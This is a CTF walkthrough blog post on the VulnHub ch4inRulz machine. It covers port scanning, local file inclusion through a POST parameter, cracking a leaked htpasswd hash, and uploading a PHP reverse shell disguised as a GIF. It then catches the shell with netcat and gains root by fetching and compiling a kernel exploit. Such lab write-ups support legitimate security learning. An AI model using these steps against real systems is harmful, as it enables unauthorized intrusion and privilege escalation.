---
layout: post-detail
title: CTF Walkthrough ch4inRulz
date: 2018-10-14
categories: CTF
description: CTF challenge, iso on https://www.vulnhub.com/entry/ch4inrulz-101,247/
img-url: ''
comments: true
---

# Iso

https://www.vulnhub.com/entry/ch4inrulz-101,247/

# Target

    $ sudo nmap -sS 192.168.2.0/24

```txt
Nmap scan report for 192.168.2.180
PORT     STATE    SERVICE
21/tcp   open     ftp
22/tcp   open     ssh
80/tcp   open     http
5269/tcp filtered xmpp-server
8011/tcp open     unknown
MAC Address: 08:00:27:BB:E5:D0 (Oracle VirtualBox virtual NIC)
```
Quick tcp scan:

    $ sudo nmap -sC -sV -vv -oA quick 192.168.2.180

```txt
21/tcp   open  ftp     syn-ack ttl 64 vsftpd 2.3.5
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to 192.168.2.236
|      Logged in as ftp
|      TYPE: ASCII
|      vsFTPd 2.3.5 - secure, fast, stable
|_End of status
22/tcp   open  ssh     syn-ack ttl 64 OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    syn-ack ttl 64 Apache httpd 2.2.22 ((Ubuntu))
| http-methods:
|_  Supported Methods: POST OPTIONS GET HEAD
|_http-title: FRANK's Website | Under development
8011/tcp open  http    syn-ack ttl 64 Apache httpd 2.2.22 ((Ubuntu))
| http-methods:
|_  Supported Methods: POST OPTIONS GET HEAD
```

+ ftp port 21 (vsFTPd 2.3.5)
+ ssh port 22 (openssh 5.9p1)
+ http port 80 (Apache httpd 2.2.22)
+ GNU/Linux Debian 5 ubuntu1.10
+ tcp port 8011 http-method = POST OPTIONS GET HEAD

I didn't know the protocol OPTIONS...

    $ nc -v 192.168.2.180 8011
    POST
    <h1>Development Server !</h1>
    OPTIONS

So the port 8011 is the Development Server

Let's look the site on port 80. We found a name `FRANK TOPE`

+ `/robots.txt` is clean.
+ `/README.md` the page is just a bootstrap template.

But all this seem useless. See the development site on `8011` with `dirb`. 

    $ dirb http://192.168.2.180:8011 /usr/share/dict/dirb-wordlists/common.txt

```txt
---- Scanning URL: http://192.168.2.180:8011/ ----
+ http://192.168.2.180:8011/index.html (CODE:200|SIZE:30)
+ http://192.168.2.180:8011/server-status (CODE:403|SIZE:296)

---- Entering directory: http://192.168.2.180:8011/api/ ----
+ http://192.168.2.180:8011/api/index.html (CODE:200|SIZE:351)
```

The `/api` page contain interesting things:

```txt
This API will be used to communicate with Frank's server
but it's still under development
* web_api.php

* records_api.php

* files_api.php

* database_api.php
```

Url `http://192.168.2.180:8011/api/files_api.php` is working.

```txt
No parameter called file passed to me

* Note : this API don't use json , so send the file name in raw format
```

So i try to send an image with GET and `curl` to see the response.

    $ curl -X GET http://192.168.2.180:8011/api/files_api.php?file=universe.jpg

```txt
<head>
  <title>franks website | simple website browser API</title>
</head>

<b>********* HACKER DETECTED *********</b>
<p>YOUR IP IS : 192.168.2.236</p><p>WRONG INPUT !!</p>%
```

Rememder into the result of nmap, the server use POST request too:

    $ curl -X POST -d file=/etc/passwd http://192.168.2.180:8011/api/files_api.php

Nice, we see an username `frank` and the path of web site `/var/www` but nothing other interesting thing for the moment.

Like the main site is in development, it contain probably many temporary files, let's check with dirb.

    $ dirb http://192.168.2.180 /usr/share/dict/dirb-wordlists/vulns/cgis.txt

```txt
---- Scanning URL: http://192.168.2.180/ ----
+ http://192.168.2.180/index.html.bak (CODE:200|SIZE:334)
- - -
+ http://192.168.2.180/development/ (CODE:401|SIZE:480)
```

The file `http://192.168.2.180/index.html.bak` is nice

```txt
<html><body><h1>It works!</h1>
<p>This is the default web page for this server.</p>
<p>The web server software is running but no content has been added, yet.</p>
<a href="/development">development</a>
<!-- I will use frank:$apr1$1oIGDEDK$/aVFPluYt56UvslZMBDoC0 as the .htpasswd file to protect the development path -->
</body></html>
```

And `/development` will serve too soon. Just to be sure, we can look if `$apr1$1oIGDEDK$/aVFPluYt56UvslZMBDoC0` is a hash or a true password:  

    $ hash-identifier 
    $apr1$1oIGDEDK$/aVFPluYt56UvslZMBDoC0
    
```txt
Possible Hashs:
[+] MD5(APR)
```
So, we have to crack this hash, we'll use `johntheripper`. Create a file name `hash` with user and hash above:

    $ vim hash
    frank:$apr1$1oIGDEDK$/aVFPluYt56UvslZMBDoC0

Save and quit.

    $ /usr/sbin/john hash

```txt
Loaded 1 password hash (FreeBSD MD5 [128/128 SSE2 intrinsics 12x])
frank!!!         (frank)
guesses: 1  time: 0:00:00:00 DONE (Fri Oct 12 15:32:15 2018)  c/s: 3800  trying: frank!! - fr4nk
```

Password acquired (`frank!!!`), Go to the page `/development` to look:

```txt
* Here is my unfinished tools list
- the uploader tool (finished but need security review)
```
So there are a hidden path somewhere, let's try to find it with dirb, we create a file for `dirb` be able to connect too:

    $ vim log
    frank:frank!!!
    :wq

And dirb:

    $ dirb http://192.168.2.180/development /usr/share/dict/dirb-wordlists/common.txt -u $(cat log)


```txt
---- Scanning URL: http://192.168.2.180/development/ ----
+ http://192.168.2.180/development/index (CODE:200|SIZE:144)
- - -
==> DIRECTORY: http://192.168.2.180/development/uploader/
+ http://192.168.2.180/development/uploader/index (CODE:200|SIZE:1187)
+ http://192.168.2.180/development/uploader/upload (CODE:200|SIZE:113)
```

So, look into `/development/uploader/`... to discover a page to upload a file. I've try to upload an other file and:

```txt
File is an image - image/jpeg.Sorry, only JPG, JPEG, PNG & GIF files are allowed.Sorry, your file was not uploaded.
```

Ok, we'll upload a gif with a payload, let's check how make this...
After few time on google, i've found a post [here](https://blackpentesters.blogspot.com/2013/08/gif-image-xss.html).  
In resume, we can add a gif header hexa code (GIF89a - this value is in any gif image) at the beginnig of any file, so we need a php reverse shell.  
I use a reverse shell found in the package `webshells`, source `https://github.com/BlackArch/webshells`.

    $ cp /usr/share/webshells/php/php-reverse-shell.php ./
    $ vim php-reverse-shell.php

On the first line, add `GIF89a` like this:

    GIF89a
    <?php

`<?php` is alrealy present, change too the value of `$ip` and `$port`, it should match with your ip. Save and quit.   
Rename the file to `shell.gif`. Next step is to upload this at `/development/uploader/`.

```txt
File is an image - image/gif.The file shell.gif has been uploaded to my uploads path.
```

`my uploads path`... I think something contain word `frank` and `upload` ?, we'll try to generate a dictionnary with crunch which contain theses words and try with dirb.

    $ crunch 5 15 -p frank upload > probe-url.txt
    $ crunch 5 15 -p FRANK upload >> probe-url.txt
    $ crunch 5 15 -p frank UPLOAD >> probe-url.txt
    $ crunch 5 15 -p frank uploads > probe-url.txt
    $ crunch 5 15 -p FRANK uploads >> probe-url.txt
    $ crunch 5 15 -p frank UPLOADs >> probe-url.txt

    $ dirb http://192.168.2.180/development/uploader ./probe-url.txt -u $(cat info)

Yes, yes, we can do it manually too :p.

```txt
==> DIRECTORY: http://192.168.2.180/development/uploader/FRANKuploads/
```

Well it's a bit of luck here. So our `shell.gif` is present, now, we prepare our listener `netcat`:

    $ nc -lnvp 1234

And we activate the shell. The file `passwd` than we found above has reveal the path `/var/www` and we have the rest (`/development/uploader/FRANKuploads/`): 

    $ curl -X POST -d "file=/var/www/development/uploader/FRANKuploads/shell.gif" http://192.168.2.180:8011/api/files_api.php

```txt
connect to [192.168.2.143] from (UNKNOWN) [192.168.2.180] 50186Linux ubuntu 2.6.35-19-generic #28-Ubuntu SMP Sun Aug 29 06:34:38 UTC 2010 x86_64 GNU/Linux
 08:14:44 up  1:02,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: can't access tty; job control turned off
```
Change the actual shell with `bash`:

    $ python -c 'import pty; pty.spawn("/bin/sh")'

First thing to do is search a flag :)

    $ find / 2>/dev/null | grep -i flag

Nothing :-( maybe something into user dir... 

    $ cd /home/frank
    $ cat user.txt
    4795aa2a9be22fac10e1c25794e75c1b
    $ cat PE.txt
    Try it as fast as you can ;)

Maybe some kernel exploits:

    $ uname -a 
    Linux ubuntu 2.6.35-19-generic #28-Ubuntu SMP Sun Aug 29 06:34:38 UTC 2010 x86_64 GNU/Linux

The command `searchsploit` with this kernel found nothing, after googling a bit to search how find exploit, i found this [post](https://www.blackmoreops.com/2017/01/17/find-linux-exploits-by-kernel-version/).  Download Linux\_Exploit\_Suggester.pl on your machine: 

    $ wget https://raw.githubusercontent.com/InteliSecureLabs/Linux_Exploit_Suggester/master/Linux_Exploit_Suggester.pl -O les.pl
    $ python2.7 -m SimpleHTTPServer 4444

On victim: 

    $ cd /tmp
    $ wget -cv 192.168.2.143:4444/les.pl
    $ perl les.pl

```txt
[+] rds
   CVE-2010-3904
   Source: http://www.exploit-db.com/exploits/15285/
```
If you have install the package `exploitdb`, so it's easy:

    $ cp /usr/share/exploitdb/exploits/linux/local/15285.c ./

On victim:

    $ wget 192.168.2.143:4444/15285.c
    $ gcc 15285.c
    $ ./a.out

```sh
[*] Linux kernel >= 2.6.30 RDS socket exploit
[*] by Dan Rosenberg
[*] Resolving kernel addresses...
 [+] Resolved security_ops to 0xffffffff81ce8df0
 [+] Resolved default_security_ops to 0xffffffff81a523e0
 [+] Resolved cap_ptrace_traceme to 0xffffffff8125db60
 [+] Resolved commit_creds to 0xffffffff810852b0
 [+] Resolved prepare_kernel_cred to 0xffffffff81085780
[*] Overwriting security ops...
[*] Overwriting function pointer...
[*] Triggering payload...
[*] Restoring function pointer...
[*] Got root!
```
    # cat /root/root.txt
    8f420533b79076cc99e9f95a1a4e5568

WTF, no flag in ascii ??? :p
